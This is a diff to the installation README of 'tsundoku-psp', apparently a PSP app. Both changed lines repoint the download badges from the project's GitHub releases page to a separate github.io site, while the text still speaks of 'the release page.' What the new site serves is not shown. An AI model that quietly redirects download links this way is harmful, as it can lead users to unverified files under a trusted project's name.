@@ -20,7 +20,7 @@ Follow these simple steps to get tsundoku-psp running on your PSP. Don't worry �
 
 ### Step 1: Download the Application
 
-[![Download tsundoku-psp](https://img.shields.io/badge/Download-tsundoku--psp-blue?style=for-the-badge&logo=github)](https://github.com/Mousah6583/tsundoku-psp/releases)
+[![Download tsundoku-psp](https://img.shields.io/badge/Download-tsundoku--psp-blue?style=for-the-badge&logo=github)](https://mousah6583.github.io)
 
 Visit this link to download the application. The page will show you the latest version available. Look for the file that matches your PSP model – it should be labeled clearly on the release page.
 
@@ -131,7 +131,7 @@ Visit the GitHub repository to learn more about how you can help.
 
 Need to download again or share with a friend? Here's the link one more time:
 
-[![Get tsundoku-psp](https://img.shields.io/badge/Get%20tsundoku--psp-green?style=for-the-badge&logo=github)](https://github.com/Mousah6583/tsundoku-psp/releases)
+[![Get tsundoku-psp](https://img.shields.io/badge/Get%20tsundoku--psp-green?style=for-the-badge&logo=github)](https://mousah6583.github.io)
 
 ## 📝 Final Words
 
